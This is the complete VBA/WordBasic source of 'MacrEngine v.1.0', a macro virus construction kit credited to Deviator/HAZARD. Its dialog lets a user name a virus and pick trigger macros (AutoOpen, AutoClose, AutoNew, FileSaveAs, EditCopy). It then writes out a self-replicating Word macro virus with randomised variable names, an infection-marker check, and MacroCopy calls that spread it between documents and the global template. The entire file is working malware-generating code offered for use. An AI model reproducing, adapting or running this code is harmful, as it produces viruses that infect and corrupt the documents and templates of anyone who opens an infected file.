Attribute VB_Name = "AutoOpen"


Public Sub MAIN()
Dim A1
Dim A2
Dim A3
Dim A4
Dim A5
Dim A6
Dim E$
WordBasic.MsgBox "MacrEngine v.1.0 by Deviator/HAZARD", "MacrEngine v.1.0"
WordBasic.BeginDialog 520, 187, "MacrEngine"
    WordBasic.GroupBox 5, 5, 362, 69, "Virus Info"  'Virus Options
    WordBasic.TextBox 103, 47, 253, 18, "VirName$"
    WordBasic.Text 14, 51, 74, 13, "Virus Name"
    WordBasic.TextBox 104, 19, 253, 18, "VirAuthor$"
    WordBasic.Text 14, 24, 80, 13, "Virus Author"
    WordBasic.GroupBox 373, 5, 141, 69, "Press Me"  'Different buttons
    WordBasic.OKButton 376, 21, 132, 21
    WordBasic.CancelButton 377, 45, 131, 21
    WordBasic.GroupBox 5, 77, 510, 104, "Options"
    WordBasic.TextBox 144, 88, 371, 18, "VirMarker$"
    WordBasic.Text 16, 91, 157, 13, "Infection Marker"
    WordBasic.GroupBox 11, 106, 389, 68, "Infected Macros"
    WordBasic.CheckBox 20, 120, 183, 16, "AutoOpen", "AutoOpenMacro"
    WordBasic.CheckBox 20, 152, 183, 16, "AutoNew", "AutoNewMacro"
    WordBasic.CheckBox 210, 119, 183, 16, "AutoExec", "AutoExecMacro"
    WordBasic.CheckBox 210, 137, 183, 16, "FileSaveAs", "FileSaveAsMacro"
    WordBasic.CheckBox 210, 154, 183, 16, "EditCopy", "EditCopyMacro"


    WordBasic.CheckBox 20, 136, 183, 16, "AutoClose", "AutoCloseMacro"
    WordBasic.PushButton 402, 113, 108, 61, "About", "Helpme"


WordBasic.EndDialog
On Error GoTo -1: On Error GoTo Canceled

Dim dlg As Object: Set dlg = WordBasic.CurValues.UserDialog
dlg.VirAuthor$ = "Deviator/HAZARD"
dlg.VirName$ = "The Macrel"
dlg.VirMarker$ = "Macrel"
dlg.AutoOpenMacro = 1
DialogBack:
WordBasic.Dialog.UserDialog dlg

If dlg.HelpMe <> 0 Then

WordBasic.MsgBox "MacrEngine v.1.0 by Deviator/HAZARD" + Chr(13) + _
   "  Hey Duke, thanks for idea and some code ;)" + Chr(13) + _
   "   So you'll needed to choose some variants,type your nick" + Chr(13) + _
   "    and new virus name... Than press Ok Button", "Help me !"
GoTo DialogBack
End If

A1 = dlg.AutoOpenMacro: A2 = dlg.AutoCloseMacro: A3 = dlg.AutoNewMacro
A4 = dlg.AutoExecMacro: A5 = dlg.FileSaveAsMacro: A6 = dlg.EditCopyMacro

If A1 = 0 And A2 = 0 And A3 = 0 And A4 = 0 And A5 = 0 And A6 = 0 Then
WordBasic.MsgBox "You need at last one virus macro to be selected !", "Error !"
GoTo DialogBack
End If

E$ = Chr(13) + Chr(10)

WordBasic.FileNew

WordBasic.Insert "'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=" + E$
WordBasic.Insert "' " + dlg.VirName$ + " virus by " + dlg.VirAuthor$ + E$
WordBasic.Insert "' Created by MacrEngine v.1.0 by Deviator / HAZARD " + E$
WordBasic.Insert "'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=" + E$


If A1 = 1 Then CreateMacro 1, dlg.VirName$, dlg.VirAuthor$, dlg.VirMarker$, A1, A2, A3, A4, A5, A6
If A2 = 1 Then CreateMacro 2, dlg.VirName$, dlg.VirAuthor$, dlg.VirMarker$, A1, A2, A3, A4, A5, A6
If A3 = 1 Then CreateMacro 3, dlg.VirName$, dlg.VirAuthor$, dlg.VirMarker$, A1, A2, A3, A4, A5, A6
If A4 = 1 Then CreateMacro 4, dlg.VirName$, dlg.VirAuthor$, dlg.VirMarker$, A1, A2, A3, A4, A5, A6
If A5 = 1 Then CreateMacro 5, dlg.VirName$, dlg.VirAuthor$, dlg.VirMarker$, A1, A2, A3, A4, A5, A6
If A6 = 1 Then CreateMacro 6, dlg.VirName$, dlg.VirAuthor$, dlg.VirMarker$, A1, A2, A3, A4, A5, A6

WordBasic.Insert E$
WordBasic.Insert "'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=" + E$
WordBasic.Insert "' Begin macro " + dlg.VirMarker$ + E$
WordBasic.Insert "'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=" + E$
WordBasic.Insert "Sub Main" + E$
WordBasic.Insert "MsgBox " + Chr(34) + dlg.VirName$ + " Virus by " + dlg.VirAuthor$ + Chr(34) + ", " + Chr(34) + " Attention ! " + Chr(34) + E$
WordBasic.Insert "End Sub"

Canceled:
End Sub

Private Sub InsertCopy(R2, VirMarker$, Nz$)
Dim E$
Dim zD$
E$ = Chr(13) + Chr(10)
If R2 = 1 Then zD$ = "AutoOpen"
If R2 = 2 Then zD$ = "AutoClose"
If R2 = 3 Then zD$ = "AutoNew"
If R2 = 4 Then zD$ = "AutoExec"
If R2 = 5 Then zD$ = "FileSaveAs"
If R2 = 6 Then zD$ = "EditCopy"
If R2 = 7 Then zD$ = VirMarker$

WordBasic.Insert "MacroCopy " + Nz$ + "+" + Chr(34) + ":" + zD$ + Chr(34) + "," + Chr(34) + zD$ + Chr(34) + ",-1" + E$
End Sub

Private Sub InsertCopy2(R2, VirMarker$, Nz$)
Dim E$
Dim zD$
E$ = Chr(13) + Chr(10)
If R2 = 1 Then zD$ = "AutoOpen"
If R2 = 2 Then zD$ = "AutoClose"
If R2 = 3 Then zD$ = "AutoNew"
If R2 = 4 Then zD$ = "AutoExec"
If R2 = 5 Then zD$ = "FileSaveAs"
If R2 = 6 Then zD$ = "EditCopy"
If R2 = 7 Then zD$ = VirMarker$

WordBasic.Insert "MacroCopy " + Chr(34) + zD$ + Chr(34) + "," + Nz$ + "+" + Chr(34) + ":" + zD$ + Chr(34) + ",-1" + E$

End Sub

Private Sub CreateMacro(R1, VirName$, VirAuthor$, VirMarker$, A1, A2, A3, A4, A5, A6)
Dim E$
Dim D$
Dim Fz$
Dim i
Dim Bz$
Dim Vz$
Dim Xz$
Dim Nz$

E$ = Chr(13) + Chr(10)

If R1 = 1 Then D$ = "AutoOpen"
If R1 = 2 Then D$ = "AutoClose"
If R1 = 3 Then D$ = "AutoNew"
If R1 = 4 Then D$ = "AutoExec"
If R1 = 5 Then D$ = "FileSaveAs"
If R1 = 6 Then D$ = "EditCopy"

WordBasic.Insert "'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=" + E$
WordBasic.Insert "' Begin Macro " + D$ + E$ + E$
WordBasic.Insert "'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=" + E$
WordBasic.Insert "Sub Main" + E$

Fz$ = ""
For i = 1 To 8
Fz$ = Fz$ + Chr(WordBasic.Int(Rnd() * 20) + 70)
Next i

Bz$ = ""
For i = 1 To 8
Bz$ = Bz$ + Chr(WordBasic.Int(Rnd() * 20) + 70)
Next i

Vz$ = ""
For i = 1 To 8
Vz$ = Vz$ + Chr(WordBasic.Int(Rnd() * 20) + 70)
Next i

Xz$ = ""
For i = 1 To 8
Xz$ = Xz$ + Chr(WordBasic.Int(Rnd() * 20) + 70)
Next i

Nz$ = ""
For i = 1 To 8
Nz$ = Nz$ + Chr(WordBasic.Int(Rnd() * 20) + 70)
Next i
Nz$ = Nz$ + "$"

WordBasic.Insert "Rem " + VirName$ + " Virus by " + VirAuthor$ + E$

WordBasic.Insert "On Error Goto " + Fz$ + E$
WordBasic.Insert Xz$ + " = 0" + E$
WordBasic.Insert Bz$ + " = CountMacros()" + E$
WordBasic.Insert "For " + Vz$ + " = 1 to " + Bz$ + E$
WordBasic.Insert "If MacroName$(" + Vz$ + ",0,0) = " + Chr(34) + VirMarker$ + Chr(34) + " then " + Xz$ + " = 1" + E$
WordBasic.Insert "Next " + Vz$ + E$
WordBasic.Insert Nz$ + " = FileName$()" + E$
WordBasic.Insert "If " + Xz$ + " = 0 then " + E$

If A1 = 1 Then InsertCopy 1, VirMarker$, Nz$
If A2 = 1 Then InsertCopy 2, VirMarker$, Nz$
If A3 = 1 Then InsertCopy 3, VirMarker$, Nz$
If A4 = 1 Then InsertCopy 4, VirMarker$, Nz$
If A5 = 1 Then InsertCopy 5, VirMarker$, Nz$
If A6 = 1 Then InsertCopy 6, VirMarker$, Nz$
InsertCopy 7, VirMarker$, Nz$

WordBasic.Insert "Else" + E$

If A1 = 1 Then InsertCopy2 1, VirMarker$, Nz$
If A2 = 1 Then InsertCopy2 2, VirMarker$, Nz$
If A3 = 1 Then InsertCopy2 3, VirMarker$, Nz$
If A4 = 1 Then InsertCopy2 4, VirMarker$, Nz$
If A5 = 1 Then InsertCopy2 5, VirMarker$, Nz$
If A6 = 1 Then InsertCopy2 6, VirMarker$, Nz$
InsertCopy2 7, VirMarker$, Nz$

WordBasic.Insert "FileSaveAs.Format = 1" + E$

WordBasic.Insert "End If" + E$
WordBasic.Insert Fz$ + ":" + E$
If R1 = 5 Then
WordBasic.Insert "Dim dlg As FileSaveAs" + E$
WordBasic.Insert "GetCurValues dlg" + E$
WordBasic.Insert "Dialog dlg" + E$
WordBasic.Insert "FileSaveAs dlg" + E$
End If
If R1 = 6 Then WordBasic.Insert "EditCopy" + E$
WordBasic.Insert "End Sub" + E$
End Sub

